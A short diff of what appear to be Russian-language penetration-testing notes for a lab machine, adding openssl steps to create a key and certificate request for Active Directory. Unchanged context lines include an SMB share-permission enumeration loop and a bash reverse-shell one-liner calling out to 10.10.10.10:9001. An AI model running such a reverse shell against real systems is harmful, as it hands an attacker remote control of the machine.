@@ -195,3 +195,17 @@ for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/Department Shares' $i;  
 --оболочка
 
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
+
+# Создание сертификата ssl для active directory
+
+--создаем ключ закрытый
+
+openssl genrsa -aes256 -out amanda.key 2048
+
+--создаем запрос на сертивфикат в центр сертификации для подписания
+
+openssl req -new -key amanda.key -out amanda.csr
+
+--просмотреть сертификат
+
+openssl x509 -in amanda.cer -text
